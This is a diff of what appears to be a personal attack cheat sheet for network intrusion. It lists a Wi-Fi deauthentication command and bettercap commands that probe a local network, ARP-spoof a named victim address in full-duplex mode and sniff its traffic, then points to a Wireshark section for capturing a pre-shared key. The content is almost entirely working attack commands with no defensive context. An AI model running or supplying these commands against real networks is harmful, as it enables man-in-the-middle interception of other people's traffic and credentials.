@@ -80,15 +80,19 @@ aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mo
 [angry ip scanner]
 [netdiscover]
 
-[bettercap]
+[bettercap] - CLI [ettercap] - GUI
 bettercap  -iface wlan0
 sudo bettercap -caplet http-ui [UI MODE]
+
 [commansd]
 net.show [shows whos connected to device]
 net.probe on [probes packetsfor recon]
+
+set arp.spoof.targets 192.168.1.10 [sets  spoof to victim]
 set arp.spoof.fullduplex true [sets attack to victim and  host]
 set arp.spoof.targets 192.168.43.157(IP address of the target Device)
 arp.spoof on
+
 set net.sniff.local true
 net.sniff on
 -----------------------------------------------------[WIRESHARK - PSK SPY ]------------------------------------------
